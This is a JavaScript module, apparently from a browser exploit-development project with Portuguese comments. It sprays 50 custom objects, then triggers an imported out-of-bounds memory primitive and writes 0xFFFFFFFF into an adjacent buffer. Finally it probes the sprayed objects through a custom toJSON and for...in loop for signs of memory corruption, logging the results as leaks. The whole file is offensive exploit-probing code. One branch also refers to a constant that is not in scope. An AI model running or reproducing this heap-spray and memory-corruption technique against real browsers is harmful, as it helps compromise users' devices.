// js/script3/testMyComplexObjectForInExploration.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG } from '../config.mjs';

class MyComplexObject {
    constructor(id) {
        this.id = `MyObj-${id}`;
        this.value1 = 12345;
        this.value2 = "initial_state";
        this.marker = 0xCAFECAFE;
        this.propA = "valA";
        this.propB = 23456;
        this.propC = null;
        this.propD = { nested_prop: "valD_original" };
        this.propE = [10, 20, 30];
    }

    // O método toJSON será definido no protótipo
}

// Definindo toJSON em MyComplexObject.prototype
MyComplexObject.prototype.toJSON = function() {
    const FNAME_toJSON = "MyComplexObject.toJSON_ForInExploration";
    let result_payload = {
        toJSON_variant: FNAME_toJSON,
        id_at_entry: String(this?.id || "N/A"),
        type_at_entry: Object.prototype.toString.call(this),
        props_iterated: [],
        errors_during_iteration: [],
        iteration_count: 0,
        max_iterations_reached: false
    };
    const MAX_PROPS_TO_LOG_DETAIL = 15;
    const MAX_ITERATIONS_SAFETY_BREAK = 200; // Para evitar congelamento total se o RangeError não for pego a tempo

    try {
        if (typeof this !== 'object' || this === null) {
            result_payload.errors_during_iteration.push("this is not an object or is null at entry");
            return result_payload;
        }

        for (const prop in this) {
            result_payload.iteration_count++;
            if (result_payload.iteration_count > MAX_ITERATIONS_SAFETY_BREAK) {
                result_payload.max_iterations_reached = true;
                result_payload.errors_during_iteration.push(`Safety break: Exceeded ${MAX_ITERATIONS_SAFETY_BREAK} iterations.`);
                break;
            }

            let prop_detail = { name: prop, type: "N/A", value_str: "N/A", error: null };
            try {
                const val = this[prop];
                prop_detail.type = typeof val;
                if (typeof val !== 'function' && typeof val !== 'object') { // Log simples para primitivos
                    prop_detail.value_str = String(val).substring(0, 50);
                } else if (Array.isArray(val)) {
                    prop_detail.value_str = `[Array(${val.length})]`;
                } else if (typeof val === 'object' && val !== null) {
                    prop_detail.value_str = `[object ${val.constructor?.name || ''}]`;
                } else if (typeof val === 'function') {
                    prop_detail.value_str = `[Function ${val.name || ''}]`;
                }
            } catch (e_prop) {
                prop_detail.error = `${e_prop.name}: ${e_prop.message}`;
                result_payload.errors_during_iteration.push(`Error accessing prop '${prop}': ${prop_detail.error}`);
            }
            if (result_payload.props_iterated.length < MAX_PROPS_TO_LOG_DETAIL) {
                 result_payload.props_iterated.push(prop_detail);
            } else if (result_payload.props_iterated.length === MAX_PROPS_TO_LOG_DETAIL) {
                 result_payload.props_iterated.push({name: "...", type: "Truncated", value_str: "Too many properties to log in detail"});
            }
        }
    } catch (e_loop) {
        // Este catch pode pegar o RangeError se ele ocorrer dentro do loop for...in
        result_payload.errors_during_iteration.push(`EXCEPTION in for...in loop: ${e_loop.name} - ${e_loop.message}`);
        logS3(`[${FNAME_toJSON}] EXCEPTION in for...in loop for ID ${this.id}: ${e_loop.name} - ${e_loop.message}`, "error", FNAME_toJSON);
        // Não re-throw para permitir que o payload seja retornado
    }
    return result_payload;
};


export async function executeForInExplorationOnComplexObject() {
    const FNAME_TEST = "executeForInExplorationOnComplexObject";
    logS3(`--- Iniciando Teste: Exploração de 'for...in' em MyComplexObject Pós-Corrupção ---`, "test", FNAME_TEST);
    document.title = `ForIn Expl. ComplexObj`;

    const spray_count = 50;
    const sprayed_objects = [];

    const corruption_offset_in_oob_ab = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const value_to_write_in_oob_ab = 0xFFFFFFFF;
    const bytes_to_write_oob_val = 4;

    logS3(`1. Pulverizando ${spray_count} instâncias de MyComplexObject...`, "info", FNAME_TEST);
    try {
        for (let i = 0; i < spray_count; i++) {
            sprayed_objects.push(new MyComplexObject(i));
        }
        logS3(`   Pulverização de ${sprayed_objects.length} objetos concluída.`, "good", FNAME_TEST);
    } catch (e_spray) {
        logS3(`ERRO durante a pulverização: ${e_spray.message}. Abortando.`, "error", FNAME_TEST);
        return;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`2. Configurando ambiente OOB e realizando escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}]...`, "info", FNAME_TEST);
    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha OOB Setup. Abortando.", "error", FNAME_TEST);
        sprayed_objects.length = 0;
        return;
    }

    try {
        oob_write_absolute(corruption_offset_in_oob_ab, value_to_write_in_oob_ab, bytes_to_write_oob_val);
        logS3(`   Escrita OOB em oob_array_buffer_real[${toHex(corruption_offset_in_oob_ab)}] realizada.`, "info", FNAME_TEST);
    } catch (e_write) {
        logS3(`   ERRO na escrita OOB: ${e_write.message}. Abortando sondagem.`, "error", FNAME_TEST);
        clearOOBEnvironment();
        sprayed_objects.length = 0;
        return;
    }

    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`3. Sondando objetos MyComplexObject pulverizados via JSON.stringify (usando MyComplexObject.prototype.toJSON)...`, "test", FNAME_TEST);
    let problem_detected = false;

    // Sondar apenas os primeiros objetos para focar no problema
    const objectsToProbe = Math.min(sprayed_objects.length, 5);
    logS3(`   Sondando os primeiros ${objectsToProbe} objetos...`, 'info', FNAME_TEST);

    for (let i = 0; i < objectsToProbe; i++) {
        const obj = sprayed_objects[i];
        if (!obj) continue;

        document.title = `Sondando MyComplexObject ${i} (ForInExpl)`;
        let stringifyResult = null;
        let errorDuringStringify = null;

        logS3(`   Testando objeto ${i} (ID: ${obj.id})...`, 'info', FNAME_TEST);
        try {
            stringifyResult = JSON.stringify(obj); // Isso chamará MyComplexObject.prototype.toJSON
            logS3(`     JSON.stringify(obj[${i}]) completou. Resultado da toJSON:`, "info", FNAME_TEST);
            logS3(JSON.stringify(stringifyResult, null, 2), "leak", FNAME_TEST); // Log formatado do payload

            if (stringifyResult && stringifyResult.errors_during_iteration && stringifyResult.errors_during_iteration.length > 0) {
                errorDuringStringify = new Error(`Erro(s) dentro da toJSON: ${stringifyResult.errors_during_iteration.join('; ')}`);
            }
            if (stringifyResult && stringifyResult.max_iterations_reached) {
                 errorDuringStringify = new Error(`Loop 'for...in' na toJSON atingiu o limite de segurança de ${MAX_ITERATIONS_SAFETY_BREAK} iterações.`);
            }

        } catch (e_str) { // Captura erros do JSON.stringify em si (como RangeError)
            errorDuringStringify = e_str;
            logS3(`     !!!! ERRO AO STRINGIFY obj[${i}] !!!!: ${e_str.name} - ${e_str.message}`, "critical", FNAME_TEST);
            if (e_str.stack) {
                logS3(`       Stack: ${e_str.stack}`, "error", FNAME_TEST);
            }
        }

        if (errorDuringStringify) {
            problem_detected = true;
            logS3(`   PROBLEMA DETECTADO COM MyComplexObject[${i}]: ${errorDuringStringify.name} - ${errorDuringStringify.message}`, "critical", FNAME_TEST);
            document.title = `PROBLEM MyComplexObj @ ${i}! (${errorDuringStringify.name})`;
            break;
        }
        await PAUSE_S3(SHORT_PAUSE_S3);
    }

    if (!problem_detected) {
        logS3("Nenhum problema óbvio (RangeError ou erro na toJSON) detectado nos objetos MyComplexObject sondados.", "good", FNAME_TEST);
    }

    logS3(`--- Teste Exploração de 'for...in' em MyComplexObject CONCLUÍDO ---`, "test", FNAME_TEST);
    clearOOBEnvironment();
    sprayed_objects.length = 0;
    globalThis.gc?.();
    document.title = problem_detected ? document.title : `ForIn Expl. ComplexObj Done`;
}
